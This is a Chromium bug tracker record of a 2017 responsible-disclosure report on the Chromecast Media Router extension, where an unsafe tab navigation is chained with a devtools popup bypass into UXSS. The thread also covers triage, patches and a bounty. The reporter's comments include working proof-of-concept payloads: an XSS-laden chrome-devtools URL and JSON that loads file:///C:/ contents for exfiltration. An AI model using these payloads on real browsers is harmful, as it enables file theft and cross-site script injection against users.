# Security: unsafe navigation in chromecast plugin possibly causing UXSS and popup block bypass

| Field | Value |
|-------|-------|
| **Issue ID** | [40089469](https://issues.chromium.org/issues/40089469) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P2 |
| **Component** | Internals>Cast>Providers |
| **Platforms** | Linux, Mac, Windows, ChromeOS |
| **Reporter** | ji...@gmail.com |
| **Assignee** | am...@chromium.org |
| **Created** | 2017-11-01 |
| **Bounty** | $500.00 |

## Description

VULNERABILITY DETAILS
In Media Router plugin(id: pkedcjkdefgpdelpbcmbmeomcjbeemfm) which is used by chrome cast, there are web_accessible_resources page which does chrome.tabs.update with user-controlled address.

web_acccessible_resources page includes cast_setup/*, and cast_setup/index.html uses cast_app.js. In cast_app.js(canary, since it's not minified) line 7527:

  $crypto$jscomp$inline_903_parsedHash$$ = $castApp$app$parseHash_$$(location.hash);
  switch($crypto$jscomp$inline_903_parsedHash$$.$component$) {
...
    case "offers":
      $crypto$jscomp$inline_903_parsedHash$$.$redemptionUrl$ ? $castApp$app$runOfferRedemption_$$($crypto$jscomp$inline_903_parsedHash$$.$redemptionUrl$) : $castApp$app$runOfferScanner_$$($webview$jscomp$5$$, $eventPageClient$jscomp$5$$);
      break;

$crypto$jscomp$inline_903_parsedHash$$ (I call it parsedHash) is parsed from "#offers/..."-like location.hash, and this case, parsedHash.component == "offers" and parsedHash.$redemptionUrl$ (I call it redemptionUrl) is "...".

When the location.hash is "#offers/http%3A//my_url", the redemptionUrl will be http://my_url, and it'll request a json file from the url. In $castApp$app$runOfferRedemption_$$(I'll simplify code since it seems compilcated):

requestJson(redemptionUrl).then(function(jscomp) {
  var redirectUrl = jscomp.url; // jscomp is the json in response
  if(redirectUrl)
    findOfferRedemptionTabs(encodeURIComponent(url)).then(
      function(tab) { chrome.tabs.update(tab.id, redirectUrl); });
  else reject();
});

findOfferRedemptionTabs:

function findOfferRedemptionTabs(escapedRedemptionUrl) {
  return new Promise(function(resolve) {
    chrome.tabs.query({
      url: ['chrome://cast/*', 'chrome-extension://' + chrome.runtime.id + '/cast_setup*']
    }, function(tabs) {
      var ret = [];
      tabs.forEach(function(tab) {
        if(tab.url.indexOf(escapedRedemptionUrl) != -1) ret.push(tab);
      resolve(ret);
    });
  });
}

redirectUrl is controlled, and the cast_setup/index.html itself can contain escapedRedemptionUrl, so a tab can navigate to any urls including chrome://, file:///, and anything except javascript:, since it's checked in each renderer.

Furthermore, the attacker can bypass popup restriction via https://crbug.com/chromium/607939, which is closed but still triggable by the URL below.

chrome-devtools://devtools/remote/serve_rev/@199588/devtools.html?1:a=0//&remoteFrontendUrl=https://chrome-devtools-frontend.appspot.com/%27%3E%3C/iframe%3E%3Cimg%20src=x%20onerror=%27eval(location.hash.substr(1))#self.open('http://google.com', '_blank')

By first bug, the extension can navigate to the URL below and bypass popup restriction, since chrome-devtools://* doesn't have it.

Then, an attacker can do UXSS on http://*/*, https://hangouts.google.com/*, https://*.google.com/cast/chromecast/home/gsse(I call it permitted urls), since there are no check for race condition between chrome.tabs.query in findOfferRedemptionTabs and runOfferRedemption_. If the tab with address chrome://cast/* or chrome-extension://pkedcjkdefgpdelpbcmbmeomcjbeemfm/cast_setup* is queried and the url is changed between two points, chrome.tabs.update can update the tabs with same id, but the permitted urls. I'll upload the video as a comment.

VERSION
Chrome Version: [64.0.3255.0] + [canary]
Operating System: Windows

REPRODUCTION CASE
A page can execute this script to navigate any page:

location = 'chrome-extension://pkedcjkdefgpdelpbcmbmeomcjbeemfm/cast_setup/cast_app.js#offers/http%3A%2F%2Flocalhost%3A31337%2Findex.json';

Before running the script, make http://localhost:31337/index.json (or any url with Access-Control-Allow-Origin: * and Content-Type: application/json) serve this json:

{
  "url": "url_to_navigate"
}


## Attachments

- [chrome_redirect_settings.zip](attachments/chrome_redirect_settings.zip) (application/octet-stream, 981 B)
- [bandicam 2017-11-09 13-16-52-735.mp4](attachments/bandicam 2017-11-09 13-16-52-735.mp4) (video/mp4, 15.3 MB)
- [bandicam 2017-11-14 10-54-45-637.mp4](attachments/bandicam 2017-11-14 10-54-45-637.mp4) (video/mp4, 703.0 KB)

## Timeline

### ji...@gmail.com (2017-11-01)

Typo: cast_setup/cast_app.js#... -> cast_setup/index.html#...

For simple PoC, I've attached the html+json file and the server.


### do...@chromium.org (2017-11-08)

+Cast API folks, can you look at this ASAP to determine the level of impact?

[Monorail components: Internals>Cast>API]

### do...@chromium.org (2017-11-08)

+cc media router extension OWNERs. PTAL asap, thanks.

### mf...@chromium.org (2017-11-09)

Is the offer flow actually being used?  Can we just disable it?

### ti...@google.com (2017-11-09)

Can we route this to ryanlc@. He and his team currently maintain this extension.

### do...@chromium.org (2017-11-09)

+ryanlc to follow up.

### mf...@chromium.org (2017-11-09)

+amp from Cloud View to track this from a release POV as I am OOO.

### am...@chromium.org (2017-11-09)

[Empty comment from Monorail migration]

### am...@chromium.org (2017-11-09)

[Empty comment from Monorail migration]

### zh...@chromium.org (2017-11-09)

Unassign myself. I am not familiar with cast app or cast setup scripts.

### pa...@chromium.org (2017-11-09)

So, I don't see a UXSS bug. Can you provide a proof of concept showing that you can bypass the smae origin policy? Maybe I'm not understanding the vulnerable code or the "race condition" comment well enough.

However, it does seem like you can get the extension to read and trust your own JSON. Are there any exciting object fields besides "url" that it will act on, that you could use to control execution flow inside the extension? Maybe not, but it sure looks suspicious...

Assigning to amp since mfoltz is OOO and ryanlc hasn't visited the bug tracker in 30 days.

### pa...@chromium.org (2017-11-09)

+dgozman for the mention of https://crbug.com/chromium/607939.

### am...@chromium.org (2017-11-09)

Taking this.  I have an internal cl almost ready (tests are failing so needs some adjustment) at cl/175096463. tilmansp@ I added you as a reviewer as you are in the owners file for the relevant code.

### am...@chromium.org (2017-11-09)

Removing android OS as the similar features there are not handled with the media router extension and aren't impacted by this.

### am...@chromium.org (2017-11-09)

[Empty comment from Monorail migration]

### ji...@gmail.com (2017-11-09)

Here is UXSS proof on hangouts.google.com, which is triggable if two or more windows are controllable. I've recorded the video since the race condition will need a unnecessarily complex code for PoC.

I prefer 2x speed for playing it..

https://www.youtube.com/watch?v=ZCtlBx5NfhY&feature=youtu.be

### ji...@gmail.com (2017-11-09)

Popup block bypass must be done for PoC without user interaction since it needs two or more window which is controllable (so the race condition can happend).

### ji...@gmail.com (2017-11-09)

Umm.. the video has removed, so I upload it here.

### es...@chromium.org (2017-11-09)

Thanks for the video. I think this is Medium severity because the user would have to navigate the tab at the exact right moment for the UXSS to be exploitable.

### ji...@gmail.com (2017-11-09)

In the report, I mentioned that even the devtools https://crbug.com/chromium/607939 is fixed, it works. (only the DevToolsHost object is not created, but it's still sufficient to open a window)

### ji...@gmail.com (2017-11-09)

@palmer: Running a javascript on an extension is not possible for now since it's checked on each renderer side (and maybe correctly checked), and there's no race condition as I see, for now.

### sh...@chromium.org (2017-11-10)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-11-10)

[Empty comment from Monorail migration]

### ji...@gmail.com (2017-11-10)

Update: a javascript code can be executed with DevToolsHost object.

Below is PoC that load any page's content.

)]}'{
	"url": "chrome-devtools://devtools/remote/serve_rev/@199588/devtools.html?1:a=0//&remoteFrontendUrl=https://chrome-devtools-frontend.appspot.com/%27%3E%3C/iframe%3E%3Cimg%20src=x%20onerror=%27eval(location.hash.substr(1))#window.w=w=self.open('chrome-devtools://devtools/remote/serve_rev/@199588/devtools.html');setTimeout(()=>{w.DevToolsAPI.streamWrite=(e,r)=>document.write(r);w.DevToolsAPI.sendMessageToEmbedder('loadNetworkResource', ['file:///C:/', '', 0])},100)"
}

### ji...@gmail.com (2017-11-10)

(This loads a page content in the devtools window, enabling file exfiltration, passive? UXSS, ...)

### am...@chromium.org (2017-11-14)

Two fixes have been pushed (for Chrome 64 and Chrome 63, a slower staged release to 62 is ongoing) to the media router extension that prevents the redirect to internal chrome-* url's. cl/175238127 and cl/175566742

Further long term fixes are being worked on.

The window opening of https://crbug.com/chromium/607939 still needs to be addressed, perhaps 607939 should be re-opened?

Marking this fixed.  Please verify.

### ji...@gmail.com (2017-11-14)

@amp: In PoC above, I could load any URL's content without user interaction. I'm wondering if it affects current severity level (medium)?

If possible, when I will be able to get the patched code (since I could not verify this as patched in chrome canary build)?

### am...@chromium.org (2017-11-14)

Ah, forgot about canary, sorry about that.  Canary should be updated with the next automated push tomorrow (we don't manually touch canary pushes as they are refreshed everyday anyway).  I'll post an update when the canary version that contains the fix is ready.

### dg...@chromium.org (2017-11-14)

Note that https://crbug.com/chromium/775527 tracks the problem described in https://crbug.com/chromium/780484#c24.

### ji...@gmail.com (2017-11-14)

@dgozman: can I see the issue?

### ji...@gmail.com (2017-11-14)

For fun, I've attached PoC video which can exfiltrate chrome Web Data files. It's just https://crbug.com/chromium/780484#c24 PoC with path file:///C:/Users/<my name>/AppData/Local/Google/Chrome/User Data/Default/Web Data

### aw...@google.com (2017-11-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-11-14)

[Empty comment from Monorail migration]

### am...@chromium.org (2017-11-14)

Canary has now been updated.

### ji...@gmail.com (2017-11-15)

I think it's correctly fixed. Thanks!

### am...@chromium.org (2017-11-15)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-12-01)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@google.com (2017-12-01)

Hi jinmoteam@ the VRP Panel took a look at this, and rewarded $500 for the initial report. The issue in #24 is covered by https://crbug.com/chromium/775527 which was filed on October 17th. Cheers, and thanks again for the report!

### aw...@chromium.org (2017-12-01)

[Empty comment from Monorail migration]

### ji...@gmail.com (2017-12-02)

Aha, so it was duplicated. Thanks for the rewards.

### aw...@google.com (2017-12-04)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-12-15)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-12-15)

This bug requires manual review: M64 has already been promoted to the beta branch, so this requires manual review
Please contact the milestone owner if you have questions.
Owners: cmasso@(Android), cmasso@(iOS), kbleicher@(ChromeOS), abdulsyed@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### am...@chromium.org (2017-12-16)

Not sure why the bot put on a merge request.  Removing the merge labels as there is nothing to merge in this change, it has been resolved since mid Nov.

### ji...@gmail.com (2017-12-17)

Although it's trivial, can I get a credit for this on chromereleases.googleblog.com ?

### aw...@google.com (2017-12-21)

[Empty comment from Monorail migration]

### aw...@google.com (2017-12-21)

I've updated https://chromereleases.googleblog.com/2017/12/stable-channel-update-for-desktop.html - still not quite sure how this one didn't make the notes in the first place, sorry about that!

### sh...@chromium.org (2018-02-20)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2018-03-27)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### ji...@gmail.com (2018-05-02)

Seems like other browser based on chrome doesn't receive any updates for this if the chrome version is old.

I'm not sure whether it should be fixed so old browser receive the update, or it's fixable, so I added this comment.

=== Example ===

Update request with current chrome version (65.0.3325.181):

https://clients2.google.com/service/update2/crx?prodversion=65.0.3325.181&x=id%3Dpkedcjkdefgpdelpbcmbmeomcjbeemfm%26v%3D6117.717.0.4%26uc

Result: <updatestatus status="ok" [crx url] ... >

Update request with old chrome version (60.0.3112.113):

https://clients2.google.com/service/update2/crx?prodversion=60.0.3112.113&x=id%3Dpkedcjkdefgpdelpbcmbmeomcjbeemfm%26v%3D6117.717.0.4%26uc

Result: <updatestatus status="noupdate" />

Thanks!

### aw...@google.com (2018-10-05)

[Empty comment from Monorail migration]

### aw...@google.com (2019-05-28)

[Empty comment from Monorail migration]

### aw...@chromium.org (2019-06-27)

[Empty comment from Monorail migration]

### is...@google.com (2019-06-27)

This issue was migrated from crbug.com/chromium/780484?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40089469)*
